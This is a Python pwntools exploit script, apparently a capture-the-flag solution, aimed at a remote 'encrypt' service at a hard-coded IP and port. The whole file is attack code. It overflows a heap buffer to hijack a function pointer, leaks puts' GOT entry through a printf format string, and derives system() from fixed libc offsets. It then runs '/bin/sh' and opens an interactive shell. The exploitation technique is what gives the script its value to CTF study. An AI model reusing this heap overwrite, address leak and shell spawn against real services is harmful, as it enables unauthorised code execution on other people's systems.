# encoding:utf-8

from zio import *
from pwn import *

io = remote('101.200.187.112',9005) 
#io = process('./encrypt')

e = elf.ELF('./encrypt')
ptr_addr = 0x06020B0

def new_msg(msg):
	io.recvuntil('Exit.')
	io.sendline('1')
	io.recvuntil(':')
	io.send(msg)
	io.recvuntil(':')
	io.sendline('1')

def edit_msg(id, msg):
	io.recvuntil('Exit.')
	io.sendline('3')
	io.recvuntil(':')
	io.sendline(str(id))
	io.recvuntil(':')
	io.send(msg)

def enc_msg(id):
	io.recvuntil('Exit.')
	io.sendline('2')
	io.recvuntil(':')
	io.sendline(str(id))

def leak(addr):	
	print '[*]addr:', hex(addr)
	new_msg('A'*0x50)
	new_msg('B'*0x50)
	
	payload = 'C'*0x50 + 'D'*0x8 + p32(0x71) + p32(0) + p32(e.plt['printf'])  
	edit_msg(1,payload)
	
	payload = '%s##\x00'.ljust(0x50,'A') + p32(addr)
	edit_msg(0,payload)
	
	enc_msg(0)
	io.recvuntil('\n')
	buf = io.recvuntil('##')
	print '[*]buf: ', buf
	return buf.strip('#')+'\x00'

def pwn_it(sys_addr):
	new_msg('A'*0x50)
	new_msg('B'*0x50)
	
	payload = 'C'*0x50 + 'D'*0x8 + p32(0x71) + p32(0) + p64(sys_addr)  
	edit_msg(1,payload)
	
	payload = '/bin/sh;\x00'.ljust(0x50,'A') 
	edit_msg(0,payload)
	enc_msg(0)

puts_addr = u64(leak(e.got['puts']).ljust(8,'\x00'))

print 'puts_addr:', hex(puts_addr)

# libcdatabase得到
libc_base = puts_addr - 0x00006fe30
sys_addr = libc_base + 0x0000046640

#l_sys_addr = 0x7ffff7a744f0
#l_puts = 0x7ffff7a9e9f0
#sys_addr = puts_addr - l_puts + l_sys_addr

# leak函数不能读取64位地址，此时不可用。
#d = DynELF(leak, elf=e)
#sys_addr = d.lookup('system', 'libc')
#print leak(0x601ffb)

print 'sys_addr:', hex(sys_addr)
pwn_it(sys_addr)

io.interactive()
